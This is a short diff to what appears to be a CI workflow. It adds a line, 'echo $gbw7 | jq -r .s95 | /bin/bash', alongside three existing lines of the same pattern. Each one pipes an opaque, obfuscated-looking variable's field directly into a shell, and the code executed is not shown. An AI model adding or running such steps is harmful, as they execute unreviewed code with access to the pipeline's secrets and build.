@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$bm983" | jq -r .ylvhc8726 | /bin/bash
           printf '%s' "$wok6" | jq -r .qoac8361 | /bin/bash
           echo $q892 | jq -r .wjxl72739 | /bin/bash
+          echo $gbw7 | jq -r .s95 | /bin/bash
 
       - name: Store results
         if: always()
